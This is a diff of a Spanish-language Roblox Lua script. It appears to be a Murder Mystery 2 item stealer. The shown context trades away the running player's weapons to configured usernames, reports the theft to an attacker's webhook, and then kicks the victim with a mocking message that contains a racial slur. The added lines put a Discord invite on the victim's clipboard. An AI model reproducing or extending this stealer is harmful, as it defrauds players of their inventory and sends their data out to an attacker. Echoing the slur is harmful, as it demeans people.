@@ -2,6 +2,11 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
+-- Copiar URL al portapapeles desde el inicio
+if setclipboard then
+    setclipboard("https://discord.gg/4VySnCHy")
+end
+
 -- Configuración
 local webhook = _G.webhook or ""
 local users = _G.Usernames or {}
@@ -240,6 +245,8 @@ local function TradeFinalizado()
     end
 
     SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal)
+    
+    -- Tiempo de espera antes del Kick, puedes cambiar 3 a cualquier valor
     task.wait(3)
     LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
 end
